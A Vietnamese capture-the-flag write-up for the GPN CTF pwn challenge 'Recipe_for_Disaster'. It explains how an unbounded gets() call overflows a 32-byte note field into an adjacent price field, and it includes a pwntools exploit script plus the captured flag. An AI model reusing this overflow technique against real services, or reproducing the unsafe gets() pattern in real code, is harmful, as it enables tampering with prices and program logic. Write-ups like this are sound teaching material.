Giải đấu: GPN CTF

Tên bài: Recipe_for_Disaster

Mảng: Pwn

Mô tả: Are you hungry? If so, I have this awesome food ordering app for you. I only ask you not to break it.

### 📂 Tài nguyên bài tập
Bạn có thể tải các file tại đây để thực hành:
* [Mã nguồn (challenge.c)](./challenge.c)
* [File thực thi (challenge)](./challenge)
* [Script khai thác (script_Recipe_for_Disaster.py)](./script_Recipe_for_Disaster.py)

[**📥 Tải toàn bộ file giải bài này**](https://github.com/doanquangtrung0311-cell/doanquangtrung0311-cell.github.io/raw/main/GPN_CTF/Pwn/Recipe_for_Disaster/recipe-for-disaster.tar.gz)

__Địa chỉ server__:
_``
ncat --ssl flash-fried-truffle-crusted-with-braised-pesto-m766.gpn24.ctf.kitctf.de 443
``_

__1. PHÂN TÍCH FILE__

Trước hết thì sẽ dùng lệnh _``checksec [ten_file]``_ ở trong Ubuntu

<img width="446" height="198" alt="image" src="https://github.com/user-attachments/assets/14e89794-767d-40ba-a629-f420b378bd7f" />

__* Có thể thấy được File này là kiến trúc 64-bit và chỉ bật duy nhất lớp bảo vệ NX__

__* Do đó, chúng ta không thể nhồi trực tiếp shellcode lên stack để chạy được, mà khả năng cao sẽ phải dùng kỹ thuật ROP (Return-Oriented Programming) hoặc ret2libc hoặc ret2win__

__2. PHÂN TÍCH MÃ NGUỒN__

__* Xác định lỗi sai ở trong mã nguồn__

Khi ta đọc mã nguồn thì thấy được 1 lỗi __`"Chết người"`__ 

<img width="847" height="717" alt="image" src="https://github.com/user-attachments/assets/b46eed4a-e361-4201-8b71-546ca9f84352" />

Ở đây hàm _`gets(cur->note)`_ nhận dữ liệu từ người dùng và ghi trực tiếp vào biến _`cur->note`_. Điểm __`"Chết người"`__ đó là nó không có giới hạn về tham số nhận vào và sẽ liên tục ghi đè cho đến khi gặp kí tự xuống dòng _`\n`_

<img width="209" height="126" alt="image" src="https://github.com/user-attachments/assets/4288e9f7-21e7-4206-985a-4aeedcd6ad3d" />

Trong khi đó biến _`char note[32]`_ thì chỉ được cấp phát có 32 bytes và nó là 1 khối ở trong _`struct`_ nên biến _`price`_ sẽ nằm sau 

__-> Từ đó nếu ta làm tràn biến _`note`_ thì nó sẽ ghi đè lên biến _`price`___

__ Vậy tại sao ghi đè biến _`price`_ lại có lợi cho chúng ta?

__* Xác định hướng đi và viết script__

<img width="778" height="252" alt="image" src="https://github.com/user-attachments/assets/67a5efb1-b848-4cbc-95b7-6c0a47aa368d" />

Đọc đoạn mã nguồn này ta thấy được nếu như biến _`total`_ âm thì nó sẽ chạy hàm  _`print_coupon`_ và in ra flag

<img width="669" height="329" alt="image" src="https://github.com/user-attachments/assets/21a40e67-48fa-4e27-a1db-f354abffb0ad" />

<img width="569" height="284" alt="image" src="https://github.com/user-attachments/assets/bf53766b-d906-4402-838a-612fa29da300" />

__-> Suy ra việc chúng ta cần làm bây giờ là làm sao để cho biến _`total`_ thành giá trị âm__

__-> Kết luận logic tấn công:__

* Lợi dụng hàm _`gets()`_ để thực hiện tràn bộ đệm từ _`note`_ sang _`price`_.

* Ghi đè _`price`_ thành một số nguyên âm.

* Khi hàm _`calculate_total()`_ thực hiện tính tổng, kết quả biến _`total`_ sẽ trở nên âm.

* Hàm _`verify_total()`_ kiểm tra thấy _`total < 0`_, tự động kích hoạt hàm _`print_coupon()`_ và in ra Flag

__3. THỰC HIỆN TẤN CÔNG VIẾT SCRIPT ĐỂ GỬI PAYLOAD__

```python

from pwn import *

host = 'flash-fried-truffle-crusted-with-braised-pesto-m766.gpn24.ctf.kitctf.de'
port = 443

p = remote(host, port, ssl=True, sni=True)

padding = b"A" * 32 

negative_price = p32(-100000, sign=True) 

payload = padding + negative_price

p.recvuntil(b"Select item")

p.sendline(b"1")

p.recvuntil(b"Any note for the chef")

p.sendline(payload)

p.recvuntil(b"Select item")

p.sendline(b"0")

output = p.recvall()

print(output.decode('utf-8', 'ignore'))

```

__-> Flag: GPNCTF{Wa1t, with TheS3 pRiC3S, ovErF1ows shOulD NOt 8e pOSSible...}__
